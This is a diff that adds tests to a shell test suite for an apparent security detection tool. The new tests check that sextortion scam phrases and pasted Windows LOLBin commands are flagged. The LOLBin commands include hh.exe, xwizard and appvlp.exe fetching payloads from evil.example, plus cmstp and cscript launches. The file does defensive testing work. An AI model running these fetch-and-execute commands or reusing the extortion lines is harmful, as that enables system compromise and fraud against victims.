@@ -11671,6 +11671,23 @@ check "url: cydia flagged" "$(./hlse_core 'cydia://evil' | head -1 | grep -c 'LO
     && check "secret FP guard: ssws prose clean" "0" "0" \
     || check "secret FP guard: ssws prose clean" "0" "1"
 
+# ── cycle-205: sextortion capability-claim vocab + LOLBins ───────
+check_text_hit 'your password was captured by my malware' 'LOG\|ALERT\|BLOCK\|ISOLATE' "text: pw-captured flagged"
+check_text_hit 'i infected you with a spyware rat' 'LOG\|ALERT\|BLOCK\|ISOLATE' "text: infected-you flagged"
+check_text_hit 'all your contacts will receive it' 'LOG\|ALERT\|BLOCK\|ISOLATE' "text: contacts-receive flagged"
+check_text_hit 'your device was compromised via adult site' 'LOG\|ALERT\|BLOCK\|ISOLATE' "text: device-compromised flagged"
+check_text_hit 'i know what you visited last night' 'LOG\|ALERT\|BLOCK\|ISOLATE' "text: visited-claim flagged"
+for c in 'hh.exe http://evil.example/x.chm' 'cmstp /s evil.inf' \
+         'xwizard runwizard http://evil.example/x' \
+         'appvlp.exe http://evil.example/x.ps1' 'cscript //E:jscript x.txt'; do
+    ./hlse_core paste "$c" 2>&1 | grep -q "ALERT\|BLOCK\|ISOLATE" \
+        && check "paste LOLBin flagged: ${c%% *}" "0" "0" \
+        || check "paste LOLBin flagged: ${c%% *}" "0" "1"
+done
+./hlse_core paste 'cmstp /a evil' 2>&1 | head -1 | grep -q "OK" \
+    && check "paste FP guard: cmstp benign clean" "0" "0" \
+    || check "paste FP guard: cmstp benign clean" "0" "1"
+
 # ── cycle-204: .ppkg carrier + cap: handler ──────────────────────
 XDIR204=$(mktemp -d /tmp/hlse204.XXXXXX)
 touch "$XDIR204/x.ppkg"
